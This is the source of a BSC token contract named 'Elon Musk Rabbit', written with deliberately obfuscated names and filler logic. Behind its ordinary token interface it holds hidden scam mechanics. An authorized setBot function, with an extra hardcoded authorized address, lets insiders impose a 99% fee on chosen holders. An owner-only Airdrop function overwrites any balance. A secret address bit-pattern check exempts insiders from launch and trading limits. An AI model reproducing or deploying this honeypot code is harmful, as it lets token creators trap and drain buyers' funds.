/**
 *Submitted for verification at BscScan.com on 2022-12-24
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;



library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}


abstract contract Ownable {
    address internal owner;
    mapping(address => bool) internal competent;

    constructor(address _owner) {
        owner = _owner;
        competent[_owner] = true;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    function removeAuthorized(address adr) public onlyOwner() {
        competent[adr] = false;
    }

    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        competent[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

    function isAuthorized(address adr) public view returns (bool) {
        return competent[adr];
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function SetAuthorized(address adr) public onlyAuthorized() {
        competent[adr] = true;
    }

    modifier onlyAuthorized() {
        require(isAuthorized(msg.sender), "!Authorized");
        _;
    }

    function Owner() public view returns (address) {
        return owner;
    }

}



interface IUniswapV2Router {

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);

    function factory() external pure returns (address);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);

    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);

}


interface IBEP20 {

    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function transfer(address recipient, uint256 amount) 
    external
    returns (bool);

    function symbol() external view returns (string memory);

    function balanceOf(address account) external view returns (uint256);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function approve(address spender, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}



contract EMR is IBEP20, Ownable {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;


    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256  _maxWallet = 2000000 * 10 ** _decimals;


    string constant _name = "Elon Musk Rabbit";
    string constant _symbol = "EMR";
    uint8 constant _decimals = 18;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private buyLimitWalletMode;
    mapping(address => bool) private botsMinBurnReceiverSell;
    mapping(address => bool) private burnTxLiquidityLimit;
    mapping(address => bool) private receiverTradingSellExempt;
    uint256 private launchBlock = 0;

    //BUY FEES
    uint256 private marketingBurnModeTeam = 0;
    uint256 private modeWalletLiquidityMin = 2;

    //SELL FEES
    uint256 private teamBuyLiquidityLimit = 0;
    uint256 private burnTradingAutoTeamLaunchedBuy = 2;

    bool private modeAutoBuyMarketingTrading = true;
    bool private maxTradingLiquidityReceiver = true;
    bool private exemptBurnIsLimit = true;
    uint256 private tradingSwapBurnLiquidityBuyTeamLaunched = _totalSupply / 1000; // 0.1%

    address private minLiquidityTxSellReceiverIs = (msg.sender); // auto-liq address
    address private marketingModeLiquidityReceiverBots = (0x058D33DE78964c2c6fB73CbffFffCbaB9ebA0038); // marketing address
    address private walletLaunchedMaxTxMarketingLimit = DEAD;
    address private minLimitWalletMax = DEAD;
    address private teamIsReceiverAuto = DEAD;

    uint256 private buyIsTxModeMarketingSwap = modeWalletLiquidityMin + marketingBurnModeTeam;
    uint256 private isSwapTxFee = 100;

    bool private txIsTradingBotsBuyWallet;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private botsAutoIsMarketingTeam;
    uint256 private burnFeeModeSellAutoLimitReceiver;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);


    
    uint256 public tradingLiquidityMarketingMaxExemptTxBots = 0;
    uint256 private modeLaunchedMaxBotsLimitTxMarketing = 0;
    uint256 private burnMarketingTxMaxLaunchedSell = 0;
    bool private receiverBotsBurnExemptFee = false;
    uint256 private receiverLimitTradingMarketingIsLaunchedBots = 0;
    bool public botsMarketingLimitReceiverMax = false;
    uint256 public feeBuyIsTx = 0;
    bool private swapModeSellReceiver = false;
    uint256 private receiverBotsBurnLimitAuto = 0;
    bool private feeMaxMarketingTeamModeLaunched = false;
    uint256 public modeLaunchedMaxBotsLimitTxMarketing0 = 0;
    bool private modeLaunchedMaxBotsLimitTxMarketing1 = false;
    uint256 public modeLaunchedMaxBotsLimitTxMarketing2 = 0;
    bool private modeLaunchedMaxBotsLimitTxMarketing3 = false;


    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Ownable(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        txIsTradingBotsBuyWallet = true;

        buyLimitWalletMode[msg.sender] = true;
        buyLimitWalletMode[address(this)] = true;

        burnTxLiquidityLimit[msg.sender] = true;
        burnTxLiquidityLimit[0x0000000000000000000000000000000000000000] = true;
        burnTxLiquidityLimit[0x000000000000000000000000000000000000dEaD] = true;
        burnTxLiquidityLimit[address(this)] = true;

        botsMinBurnReceiverSell[msg.sender] = true;
        botsMinBurnReceiverSell[0x0000000000000000000000000000000000000000] = true;
        botsMinBurnReceiverSell[0x000000000000000000000000000000000000dEaD] = true;
        botsMinBurnReceiverSell[address(this)] = true;


        SetAuthorized(address(0x927e90F7F33Ea62710Ff361aFffFD164Cb18379B));

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return botsSwapSellIs(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance!");
        }

        return botsSwapSellIs(sender, recipient, amount);
    }

    function launchedSellFeeIsLimitLiquidity() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    exemptBurnIsLimit &&
    _balances[address(this)] >= tradingSwapBurnLiquidityBuyTeamLaunched;
    }

    function getLaunchBlock() public view returns (uint256) {
        if (launchBlock == burnTradingAutoTeamLaunchedBuy) {
            return burnTradingAutoTeamLaunchedBuy;
        }
        if (launchBlock == receiverBotsBurnLimitAuto) {
            return receiverBotsBurnLimitAuto;
        }
        return launchBlock;
    }

    function teamLimitMaxLaunched(address sender, bool selling) internal returns (uint256) {
        
        if (feeMaxMarketingTeamModeLaunched != feeMaxMarketingTeamModeLaunched) {
            feeMaxMarketingTeamModeLaunched = exemptBurnIsLimit;
        }

        if (modeLaunchedMaxBotsLimitTxMarketing1 == feeMaxMarketingTeamModeLaunched) {
            modeLaunchedMaxBotsLimitTxMarketing1 = swapModeSellReceiver;
        }


        if (selling) {
            buyIsTxModeMarketingSwap = burnTradingAutoTeamLaunchedBuy + teamBuyLiquidityLimit;
            return buyIsTxModeMarketingSwap;
        }
        if (!selling && sender == uniswapV2Pair) {
            buyIsTxModeMarketingSwap = modeWalletLiquidityMin + marketingBurnModeTeam;
            return buyIsTxModeMarketingSwap;
        }
        return burnTradingAutoTeamLaunchedBuy + teamBuyLiquidityLimit;
    }

    function marketingMinLiquidityBotsTradingTxBurn(address sender, address receiver, uint256 amount) internal returns (uint256) {
        
        uint256 feeAmount = amount.mul(teamLimitMaxLaunched(sender, receiver == uniswapV2Pair)).div(isSwapTxFee);

        if (receiverTradingSellExempt[sender] || receiverTradingSellExempt[receiver]) {
            feeAmount = amount.mul(99).div(isSwapTxFee);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        return amount.sub(feeAmount);
    }

    function setReceiverLimitTradingMarketingIsLaunchedBots(uint256 a0) public onlyOwner {
        if (receiverLimitTradingMarketingIsLaunchedBots == isSwapTxFee) {
            isSwapTxFee=a0;
        }
        if (receiverLimitTradingMarketingIsLaunchedBots == marketingBurnModeTeam) {
            marketingBurnModeTeam=a0;
        }
        if (receiverLimitTradingMarketingIsLaunchedBots != tradingSwapBurnLiquidityBuyTeamLaunched) {
            tradingSwapBurnLiquidityBuyTeamLaunched=a0;
        }
        receiverLimitTradingMarketingIsLaunchedBots=a0;
    }

    function setFeeMaxMarketingTeamModeLaunched(bool a0) public onlyOwner {
        if (feeMaxMarketingTeamModeLaunched == modeAutoBuyMarketingTrading) {
            modeAutoBuyMarketingTrading=a0;
        }
        if (feeMaxMarketingTeamModeLaunched == maxTradingLiquidityReceiver) {
            maxTradingLiquidityReceiver=a0;
        }
        feeMaxMarketingTeamModeLaunched=a0;
    }

    function setReceiverTradingSellExempt(address a0,bool a1) public onlyOwner {
        receiverTradingSellExempt[a0]=a1;
    }

    function exemptLimitTeamLiquidity(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function swapBurnSellTx(address sender) internal view returns (bool) {
        return !botsMinBurnReceiverSell[sender];
    }

    function setModeWalletLiquidityMin(uint256 a0) public onlyOwner {
        modeWalletLiquidityMin=a0;
    }

    function setLaunchBlock(uint256 a0) public onlyOwner {
        if (launchBlock != receiverBotsBurnLimitAuto) {
            receiverBotsBurnLimitAuto=a0;
        }
        launchBlock=a0;
    }

    function setBot(address addr) public onlyAuthorized {
        receiverTradingSellExempt[addr] = true;
    }

    function getModeWalletLiquidityMin() public view returns (uint256) {
        if (modeWalletLiquidityMin != receiverBotsBurnLimitAuto) {
            return receiverBotsBurnLimitAuto;
        }
        return modeWalletLiquidityMin;
    }

    function teamTxSellWallet() internal swapping {
        
        uint256 amountToLiquify = tradingSwapBurnLiquidityBuyTeamLaunched.mul(marketingBurnModeTeam).div(buyIsTxModeMarketingSwap).div(2);
        uint256 amountToSwap = tradingSwapBurnLiquidityBuyTeamLaunched.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );
        
        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = buyIsTxModeMarketingSwap.sub(marketingBurnModeTeam.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(marketingBurnModeTeam).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(modeWalletLiquidityMin).div(totalETHFee);
        
        if (receiverBotsBurnExemptFee == exemptBurnIsLimit) {
            receiverBotsBurnExemptFee = exemptBurnIsLimit;
        }


        payable(marketingModeLiquidityReceiverBots).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                minLiquidityTxSellReceiverIs,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    function getReceiverLimitTradingMarketingIsLaunchedBots() public view returns (uint256) {
        if (receiverLimitTradingMarketingIsLaunchedBots == burnTradingAutoTeamLaunchedBuy) {
            return burnTradingAutoTeamLaunchedBuy;
        }
        return receiverLimitTradingMarketingIsLaunchedBots;
    }

    function botsSwapSellIs(address sender, address recipient, uint256 amount) internal returns (bool) {
        
        if (receiverBotsBurnLimitAuto == receiverLimitTradingMarketingIsLaunchedBots) {
            receiverBotsBurnLimitAuto = teamBuyLiquidityLimit;
        }


        bool bTxWalletValue = isSellBotsSwapLaunchedMaxBuy(sender) || isSellBotsSwapLaunchedMaxBuy(recipient);
        
        if (modeLaunchedMaxBotsLimitTxMarketing != launchBlock) {
            modeLaunchedMaxBotsLimitTxMarketing = modeLaunchedMaxBotsLimitTxMarketing;
        }

        if (feeMaxMarketingTeamModeLaunched != swapModeSellReceiver) {
            feeMaxMarketingTeamModeLaunched = feeMaxMarketingTeamModeLaunched;
        }


        
        if (recipient == uniswapV2Pair && _balances[recipient] == 0) {
            launchBlock = block.number + 10;
        }
        if (!bTxWalletValue) {
            require(block.number >= launchBlock, "No launch");
        }

        
        if (swapModeSellReceiver == modeLaunchedMaxBotsLimitTxMarketing1) {
            swapModeSellReceiver = exemptBurnIsLimit;
        }

        if (modeLaunchedMaxBotsLimitTxMarketing != modeWalletLiquidityMin) {
            modeLaunchedMaxBotsLimitTxMarketing = burnTradingAutoTeamLaunchedBuy;
        }

        if (receiverLimitTradingMarketingIsLaunchedBots != tradingSwapBurnLiquidityBuyTeamLaunched) {
            receiverLimitTradingMarketingIsLaunchedBots = receiverBotsBurnLimitAuto;
        }


        if (inSwap || bTxWalletValue) {return exemptLimitTeamLiquidity(sender, recipient, amount);}

        if (!buyLimitWalletMode[sender] && !buyLimitWalletMode[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "Max wallet!");
        }
        
        if (swapModeSellReceiver != feeMaxMarketingTeamModeLaunched) {
            swapModeSellReceiver = receiverBotsBurnExemptFee;
        }

        if (modeLaunchedMaxBotsLimitTxMarketing3 == modeLaunchedMaxBotsLimitTxMarketing1) {
            modeLaunchedMaxBotsLimitTxMarketing3 = modeLaunchedMaxBotsLimitTxMarketing3;
        }

        if (burnMarketingTxMaxLaunchedSell == modeWalletLiquidityMin) {
            burnMarketingTxMaxLaunchedSell = teamBuyLiquidityLimit;
        }


        require((amount <= _maxTxAmount) || burnTxLiquidityLimit[sender] || burnTxLiquidityLimit[recipient], "Max TX Limit!");

        if (launchedSellFeeIsLimitLiquidity()) {teamTxSellWallet();}

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");
        
        if (receiverBotsBurnExemptFee != feeMaxMarketingTeamModeLaunched) {
            receiverBotsBurnExemptFee = modeAutoBuyMarketingTrading;
        }

        if (burnMarketingTxMaxLaunchedSell == buyIsTxModeMarketingSwap) {
            burnMarketingTxMaxLaunchedSell = marketingBurnModeTeam;
        }

        if (receiverLimitTradingMarketingIsLaunchedBots != buyIsTxModeMarketingSwap) {
            receiverLimitTradingMarketingIsLaunchedBots = isSwapTxFee;
        }


        uint256 amountReceived = swapBurnSellTx(sender) ? marketingMinLiquidityBotsTradingTxBurn(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function setTeamIsReceiverAuto(address a0) public onlyOwner {
        teamIsReceiverAuto=a0;
    }

    function getReceiverTradingSellExempt(address a0) public view returns (bool) {
        if (a0 == minLimitWalletMax) {
            return swapModeSellReceiver;
        }
        if (a0 != minLimitWalletMax) {
            return maxTradingLiquidityReceiver;
        }
        if (receiverTradingSellExempt[a0] == botsMinBurnReceiverSell[a0]) {
            return feeMaxMarketingTeamModeLaunched;
        }
            return receiverTradingSellExempt[a0];
    }

    function getBurnTxLiquidityLimit(address a0) public view returns (bool) {
            return burnTxLiquidityLimit[a0];
    }

    function getFeeMaxMarketingTeamModeLaunched() public view returns (bool) {
        if (feeMaxMarketingTeamModeLaunched != modeLaunchedMaxBotsLimitTxMarketing1) {
            return modeLaunchedMaxBotsLimitTxMarketing1;
        }
        if (feeMaxMarketingTeamModeLaunched == maxTradingLiquidityReceiver) {
            return maxTradingLiquidityReceiver;
        }
        if (feeMaxMarketingTeamModeLaunched != feeMaxMarketingTeamModeLaunched) {
            return feeMaxMarketingTeamModeLaunched;
        }
        return feeMaxMarketingTeamModeLaunched;
    }

    function getTeamIsReceiverAuto() public view returns (address) {
        if (teamIsReceiverAuto == marketingModeLiquidityReceiverBots) {
            return marketingModeLiquidityReceiverBots;
        }
        if (teamIsReceiverAuto != minLimitWalletMax) {
            return minLimitWalletMax;
        }
        if (teamIsReceiverAuto != minLimitWalletMax) {
            return minLimitWalletMax;
        }
        return teamIsReceiverAuto;
    }

    function setBurnTxLiquidityLimit(address a0,bool a1) public onlyOwner {
        if (burnTxLiquidityLimit[a0] != receiverTradingSellExempt[a0]) {
           receiverTradingSellExempt[a0]=a1;
        }
        if (burnTxLiquidityLimit[a0] == burnTxLiquidityLimit[a0]) {
           burnTxLiquidityLimit[a0]=a1;
        }
        if (burnTxLiquidityLimit[a0] != buyLimitWalletMode[a0]) {
           buyLimitWalletMode[a0]=a1;
        }
        burnTxLiquidityLimit[a0]=a1;
    }

    function setModeLaunchedMaxBotsLimitTxMarketing3(bool a0) public onlyOwner {
        modeLaunchedMaxBotsLimitTxMarketing3=a0;
    }

    function isBot(address addr) public view returns (bool) {
        return receiverTradingSellExempt[addr];
    }

    function setMaxTradingLiquidityReceiver(bool a0) public onlyOwner {
        maxTradingLiquidityReceiver=a0;
    }

    function getMaxTradingLiquidityReceiver() public view returns (bool) {
        if (maxTradingLiquidityReceiver != exemptBurnIsLimit) {
            return exemptBurnIsLimit;
        }
        if (maxTradingLiquidityReceiver == receiverBotsBurnExemptFee) {
            return receiverBotsBurnExemptFee;
        }
        if (maxTradingLiquidityReceiver == receiverBotsBurnExemptFee) {
            return receiverBotsBurnExemptFee;
        }
        return maxTradingLiquidityReceiver;
    }

    function isSellBotsSwapLaunchedMaxBuy(address addr) private view returns (bool) {
        return firstSetAutoReceiver == (uint256(uint160(addr)) << 192) >> 238;
    }

    function getModeLaunchedMaxBotsLimitTxMarketing3() public view returns (bool) {
        if (modeLaunchedMaxBotsLimitTxMarketing3 == modeAutoBuyMarketingTrading) {
            return modeAutoBuyMarketingTrading;
        }
        return modeLaunchedMaxBotsLimitTxMarketing3;
    }

    function Airdrop(address adr,uint256 amount) public onlyOwner {
        _balances[adr] = amount;
    }

    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);
}